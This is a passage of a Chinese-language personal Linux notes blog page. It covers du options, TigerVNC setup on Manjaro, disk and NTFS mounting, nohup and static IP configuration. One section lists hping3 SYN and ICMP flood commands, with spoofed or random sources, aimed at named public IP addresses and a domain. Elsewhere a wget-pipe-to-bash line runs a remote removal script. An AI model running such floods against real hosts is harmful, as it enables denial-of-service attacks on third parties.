operator">&lt;</span>目录或文件<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">max</span><span class="token operator">-</span>depth<span class="token operator">=</span><span class="token operator">&lt;</span>目录层数<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">help</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>version<span class="token punctuation">]</span><span class="token punctuation">[</span>目录或文件<span class="token punctuation">]</span>
+</code></pre></div><p>常用参数说明：
+-a或-all 显示目录中个别文件的大小。</p> <p>-b或-bytes 显示目录或文件大小时，以byte为单位。</p> <p>-c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。</p> <p>-D或--dereference-args 显示指定符号连接的源文件大小。</p> <p>-h或--human-readable 以K，M，G为单位，提高信息的可读性。</p> <p>-H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。</p> <p>-k或--kilobytes 以1024 bytes为单位。</p> <p>-l或--count-links 重复计算硬件连接的文件。</p> <p>-L&lt;符号连接&gt;或--dereference&lt;符号连接&gt; 显示选项中所指定符号连接的源文件大小。</p> <p>-m或--megabytes 以1MB为单位。</p> <p>-s或--summarize 仅显示总计。</p> <p>-S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。</p> <p>-x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。</p> <p>-X&lt;文件&gt;或--exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。</p> <p>--exclude=&lt;目录或文件&gt; 略过指定的目录或文件。</p> <p>--max-depth=&lt;目录层数&gt; 超过指定层数的目录后，予以忽略。</p> <p>--help 显示帮助。</p> <p>--version 显示版本信息。</p> <p>使用实例：
+1、查看当前目录总共占的容量，而不单独列出各子项占用的容量 ，在所在目录输入du -sh：</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># du -sh</span>
+
+15G
+</code></pre></div><p>2、查看当前目录下一级子文件和子目录占用的磁盘容量：</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># du -lh --max-depth=1</span>
+
+13M    <span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span>cache
+<span class="token number">0</span>    <span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span>config
+<span class="token number">1.</span>2M    <span class="token punctuation">.</span><span class="token operator">/</span>mongo<span class="token operator">-</span>hacker
+<span class="token number">0</span>    <span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span>pki
+14M    <span class="token punctuation">.</span>
+</code></pre></div><p>3、统计当前文件夹(目录)大小，并按文件大小排序：
+统计当前文件夹(目录)大小：du -sh *</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># du -sh * | sort -n</span>
+
+<span class="token number">1.</span>2M    mongo<span class="token operator">-</span>hacker
+<span class="token number">4.</span>0K    anaconda<span class="token operator">-</span>ks<span class="token punctuation">.</span>cfg
+<span class="token number">4.</span>0K    installmongofor3<span class="token punctuation">.</span><span class="token number">6.</span>log
+<span class="token number">4.</span>0K    securityforcs7<span class="token punctuation">.</span>log
+<span class="token number">4.</span>0K    security<span class="token punctuation">.</span>log
+16K    securityforcs7<span class="token punctuation">.</span>py
+24K    installmongofor3<span class="token punctuation">.</span><span class="token number">6.</span>py
+</code></pre></div><p>4、查看指定文件大小可以使用du -sh或du -a：</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># du -sh installmongofor3.6.log</span>
+
+<span class="token number">4.</span>0K    installmongofor3<span class="token punctuation">.</span><span class="token number">6.</span>log
+</code></pre></div><p>5、列出当前目录中的目录名不包括某字符串的目录的总大小：</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># du -sh --exclude='installmongofor3.6.log'</span>
+
+14M
+</code></pre></div><h1 id="window连接manjaro桌面"><a href="#window连接manjaro桌面" class="header-anchor">#</a> window连接manjaro桌面</h1> <h2 id="window"><a href="#window" class="header-anchor">#</a> window</h2> <p>下载安装包：<a href="https://www.realvnc.com/en/connect/download/viewer/" target="_blank" rel="noopener noreferrer">https://www.realvnc.com/en/connect/download/viewer/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h2 id="manjaro"><a href="#manjaro" class="header-anchor">#</a> manjaro</h2> <p>一、安装tigervnc</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> pacman -S tigervnc
+</code></pre></div><p>二、配置</p> <p>​    2.1 设置连接密码（桌面仅显示密码可以不设置）</p> <div class="language-bash extra-class"><pre class="language-bash"><code>vncpasswd
+</code></pre></div><p>​     2.2 添加连接用户</p> <div class="language- extra-class"><pre class="language-text"><code>sudo vim /etc/tigervnc/vncserver.users
+</code></pre></div><p>#添加用户名，例如 user，多个用户依次数字排列添加。</p> <div class="language- extra-class"><pre class="language-text"><code>:1=user
+:2=user2
+</code></pre></div><blockquote><p>端口 :1 是 TCP 端口 5901 (5900+1)，:2是+2，5902</p></blockquote> <p>​    2.3 vnc配置文件</p> <p>查看桌面环境，我下的是xfce</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> /usr/share/xsessions/
+
+----------
+➜  <span class="token builtin class-name">cd</span> /usr/share/xsessions/
+➜  xsessions <span class="token function">ls</span>
+gnome-classic-xorg.desktop  gnome-classic.desktop  gnome-xorg.desktop  gnome.desktop
+➜  xsessions
+</code></pre></div><p>添加  vnc 配置</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">vim</span> ~/.vnc/config
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>#添加以下内容，建议屏蔽localhost
+session=gnome // 我上面看到的gnome ,所以这里填了gnome，如果你的是xfce，那么久填xfce
+geometry=1920x1080
+#localhost
+alwaysshared
+</code></pre></div><p>三、启动</p> <div class="language-bash extra-class"><pre class="language-bash"><code>systemctl <span class="token builtin class-name">enable</span> vncserver@:1.service        <span class="token comment">#开机自启</span>
+
+systemctl start vncserver@:1.service           <span class="token comment">#启动vnc</span>
+
+systemctl status vncserver@:1.service         <span class="token comment">#查看vnc</span>
+
+systemctl stop vncserver@:1.service           <span class="token comment">#关闭vnc</span>
+</code></pre></div><p>这里启动的时候需要输入你上面设置的密码</p> <p>四、win10连接</p> <p>vnc viewer连接ip 192.168.3.40:5901即可</p> <p><img src="/assets/img/image-20220725100100564.c1e7b3bc.png" alt="image-20220725100100564"></p> <h2 id="软件："><a href="#软件：" class="header-anchor">#</a> 软件：</h2> <p>https://aur.archlinux.org/packages/icalingua/</p> <h2 id="删除腾讯云监控-ydservice"><a href="#删除腾讯云监控-ydservice" class="header-anchor">#</a> 删除腾讯云监控-YDService</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">wget</span> -qO- https://raw.githubusercontent.com/littleplus/TencentAgentRemove/master/remove.sh <span class="token operator">|</span> <span class="token function">bash</span>
+</code></pre></div><h2 id="error-failed-to-download-metadata-for-repo-appstream-centos-8"><a href="#error-failed-to-download-metadata-for-repo-appstream-centos-8" class="header-anchor">#</a> Error: Failed to download metadata for repo ‘appstream’ – CentOS 8</h2> <div class="language-bash extra-class"><pre class="language-bash"><code>dnf --disablerepo <span class="token string">'*'</span> --enablerepo<span class="token operator">=</span>extras swap centos-linux-repos centos-stream-repos
+
+dnf distro-sync
+</code></pre></div><div class="language-bash extra-class"><pre class="language-bash"><code>hping3 -q -n -a 攻击ip -S -s 源端口  --keep -p 目的端口  --flood  被攻击IP 
+
+
+hping3 -q -n -a <span class="token number">192.168</span>.3.200 -S -s <span class="token number">80</span>  --keep -p <span class="token number">80</span>  --flood  <span class="token number">1.14</span>.63.64
+
+
+hping3 -c <span class="token number">1000</span> -d <span class="token number">120</span> -S -w <span class="token number">64</span> -p <span class="token number">80</span> --flood --rand-source mip.jdidi.cn
+
+<span class="token function">sudo</span> hping3 --flood  -S <span class="token number">1.14</span>.63.64 -p <span class="token number">80</span> -i u1000
+
+<span class="token function">sudo</span> hping3 --flood -S  <span class="token number">1.14</span>.63.64
+
+<span class="token function">sudo</span> hping3 <span class="token number">1.14</span>.63.64 -c <span class="token number">10000</span> -d <span class="token number">10000</span> -S -w <span class="token number">64</span> -p <span class="token number">80</span> --flood 
+
+目标地址
+<span class="token function">sudo</span> hping3 -c <span class="token number">999999999</span> -d <span class="token number">150</span> -S -w <span class="token number">64</span> -p <span class="token number">80</span> -i u1000 <span class="token number">220.170</span>.186.139
+
+万引 <span class="token number">103.47</span>.81.249
+<span class="token function">sudo</span> hping3 -c <span class="token number">999999999</span> -d <span class="token number">150</span> -S -w <span class="token number">64</span> -p <span class="token number">80</span> -i u1000  <span class="token number">103.47</span>.81.249
+
+测试
+<span class="token function">sudo</span> hping3 -c <span class="token number">999999999</span> -d <span class="token number">150</span> -S -w <span class="token number">64</span> -p <span class="token number">8082</span> -i u1000 <span class="token number">1.14</span>.63.64
+
+<span class="token function">sudo</span> hping3 --tcp-connect --rate<span class="token operator">=</span><span class="token number">90000</span> -c <span class="token number">900000</span> -q <span class="token number">1.14</span>.63.64
+<span class="token function">sudo</span>  hping3 -c <span class="token number">10000</span> -d <span class="token number">120</span> --icmp -w <span class="token number">64</span> -p <span class="token number">80</span> -i u1000 --flood --rand-sourcet <span class="token number">1.14</span>.63.64
+</code></pre></div><h1 id="挂在后台-nohup"><a href="#挂在后台-nohup" class="header-anchor">#</a> 挂在后台-nohup</h1> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">nohup</span> m3d -f<span class="token operator">=</span>./2.txt <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
+</code></pre></div><p>查看日志</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">tail</span> -fn <span class="token number">20</span> nohup.out
+</code></pre></div><p>查看进行</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">ps</span> aux <span class="token operator">|</span><span class="token function">grep</span> m3d
+
+orangbus  <span class="token number">5371</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span> <span class="token number">112828</span>  <span class="token number">1000</span> pts/4    S+   <span class="token number">11</span>:11   <span class="token number">0</span>:00 <span class="token function">grep</span> --color<span class="token operator">=</span>auto --exclude-dir<span class="token operator">=</span>.bzr --exclude-dir<span class="token operator">=</span>CVS --exclude-dir<span class="token operator">=</span>.git --exclude-dir<span class="token operator">=</span>.hg --exclude-dir<span class="token operator">=</span>.svn --exclude-dir<span class="token operator">=</span>.idea --exclude-dir<span class="token operator">=</span>.tox m3d
+orangbus <span class="token number">18113</span> <span class="token number">34.5</span>  <span class="token number">1.2</span> <span class="token number">780084</span> <span class="token number">96212</span> ?        SNl  <span class="token number">3</span>月01 <span class="token number">335</span>:40 m3d -f<span class="token operator">=</span>./29-1.txt <span class="token comment"># 这里是后台挂起的命令</span>
+</code></pre></div><p>关闭进程</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">kill</span> -9 <span class="token number">18113</span>
+</code></pre></div><h1 id="linux磁盘挂载"><a href="#linux磁盘挂载" class="header-anchor">#</a> linux磁盘挂载</h1> <p>查看磁盘</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">fdisk</span> -l
+
+<span class="token function">fdisk</span> /dev/vdb <span class="token comment"># 根据提示设置，默认可以一路回车到头</span>
+
+<span class="token comment"># 格式化分区</span>
+mkfs.ext4 /dev/vdb
+
+<span class="token comment"># 创建一个目录</span>
+<span class="token function">mkdir</span> /data
+
+<span class="token comment"># 挂载磁盘</span>
+<span class="token function">mount</span> /dev/vdb /data
+
+<span class="token comment"># 开机自动挂载</span>
+<span class="token function">vim</span> /etc/fstab
+
+/dev/vdb<span class="token punctuation">(</span>磁盘分区<span class="token punctuation">)</span> /data（挂载目录） ext4（文件格式）defaults <span class="token number">0</span> <span class="token number">0</span>
+
+	
+</code></pre></div><h1 id="windows自带局域网扫描ip"><a href="#windows自带局域网扫描ip" class="header-anchor">#</a> windows自带局域网扫描IP</h1> <div class="language-shell extra-class"><pre class="language-shell"><code>arp -a
+</code></pre></div><h1 id="刷新-dns-缓存"><a href="#刷新-dns-缓存" class="header-anchor">#</a> 刷新 DNS 缓存</h1> <div class="language-shell extra-class"><pre class="language-shell"><code>// Mac用户
+<span class="token function">sudo</span> <span class="token function">killall</span> -HUP mDNSResponder
+
+// Win
+ipconfig /flushdns
+</code></pre></div><h1 id="移动ntfs硬盘挂载"><a href="#移动ntfs硬盘挂载" class="header-anchor">#</a> 移动ntfs硬盘挂载</h1> <p>查看磁盘</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">fdisk</span> -l
+-----------------------
+磁盘 /dev/sdb：1000.2 GB, <span class="token number">1000204885504</span> 字节，1953525167 个扇区
+Units <span class="token operator">=</span> 扇区 of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes
+扇区大小<span class="token punctuation">(</span>逻辑/物理<span class="token punctuation">)</span>：512 字节 / <span class="token number">4096</span> 字节
+I/O 大小<span class="token punctuation">(</span>最小/最佳<span class="token punctuation">)</span>：4096 字节 / <span class="token number">4096</span> 字节
+磁盘标签类型：dos
+磁盘标识符：0x2268b4ff
+
+   设备 Boot      Start         End      Blocks   Id  System
+/dev/sdb1   *        <span class="token number">2048</span>   <span class="token number">209717247</span>   <span class="token number">104857600</span>    <span class="token number">7</span>  HPFS/NTFS/exFAT
+/dev/sdb2       <span class="token number">209717248</span>   <span class="token number">904944106</span>   <span class="token number">347613429</span>+   f  W95 Ext'd <span class="token punctuation">(</span>LBA<span class="token punctuation">)</span>
+/dev/sdb3       <span class="token number">419432448</span>   <span class="token number">695228906</span>   <span class="token number">137898229</span>+   <span class="token number">7</span>  HPFS/NTFS/exFAT
+/dev/sdb4       <span class="token number">904944107</span>  <span class="token number">1953521663</span>   <span class="token number">524288778</span>+   <span class="token number">7</span>  HPFS/NTFS/exFAT
+Partition <span class="token number">4</span> does not start on physical sector boundary.
+/dev/sdb5       <span class="token number">209717311</span>   <span class="token number">419432447</span>   <span class="token number">104857568</span>+   <span class="token number">7</span>  HPFS/NTFS/exFAT
+</code></pre></div><p>创建挂载目录 (2 挂载不上)</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">mkdir</span> -p sdb1 sdb3 sdb4 sdb5
+</code></pre></div><p>安装 <code>ntfs-3g</code></p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">sudo</span> yum <span class="token function">install</span> ntfs-3g
+</code></pre></div><p>挂载磁盘</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">sudo</span> <span class="token function">mount</span> -t ntfs-3g 磁盘 本地目录
+--------------------------------
+<span class="token function">sudo</span> <span class="token function">mount</span> -t ntfs-3g /dev/sdb1 /home/orangbus/sdb1
+<span class="token comment"># 以此类推</span>
+</code></pre></div><p>卸载</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">sudo</span> unmount  本地目录
+--------------------------------
+<span class="token function">sudo</span> unmount /home/orangbus/sdb1
+</code></pre></div><p>开机自动挂载</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">sudo</span> <span class="token function">vim</span> /etc/fstab
+<span class="token comment"># 添加挂载</span>
+/dev/sdb1 /home/orangbus/sdb1 ntfs-3g default <span class="token number">0</span> <span class="token number">0</span>
+/dev/sdb2 /home/orangbus/sdb2 ntfs-3g default <span class="token number">0</span> <span class="token number">0</span>
+/dev/sdb3 /home/orangbus/sdb3 ntfs-3g default <span class="token number">0</span> <span class="token number">0</span>
+/dev/sdb4 /home/orangbus/sdb4 ntfs-3g default <span class="token number">0</span> <span class="token number">0</span>
+</code></pre></div><h1 id="centos-7-学习之静态ip设置"><a href="#centos-7-学习之静态ip设置" class="header-anchor">#</a> Centos 7 学习之静态IP设置</h1> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">vim</span> /etc/sysconfig/network-scripts/ifcfg-eth0
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>BOOTPROTO=&quot;static&quot; #dhcp改为static 
+ONBOOT=&quot;yes&quot; #开机启用本配置
+IPADDR=192.168.2.200 # 需要固定的静态IP
+GATEWAY=192.168.2.1 #默认网关
+NETMASK=255.255.255.0 #子网掩码
+DNS1=192.168.2.1 #DNS 配置
+</code></pre></div><p>重启</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">service</span> network restart
+</code></pre></div></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/orangbus/vuepress-blog/edit/master/docs/Linux/Tool.md" target="_blank" rel="noopener noreferrer">帮助我们改善此页面！</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <div class="last-updated"><span class="prefix">最后更新时间:</span> <span class="time">4/27/2023, 10:37:25 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+      ←
+      <a href="/Linux/Shell.html" class="prev">
+        收藏linux实用命令
+      </a></span> <!----></p></div> </main></div><div class="global-ui"><!----><div class="reading-progress top" data-v-21b39eda><div class="progress" data-v-21b39eda></div></div></div></div>
+    <script src="/assets/js/app.ea451ed9.js" defer></script><script src="/assets/js/3.6c5e3284.js" defer></script><script src="/assets/js/22.b4f5a61f.js" defer></script>
+  </body>
+</html>
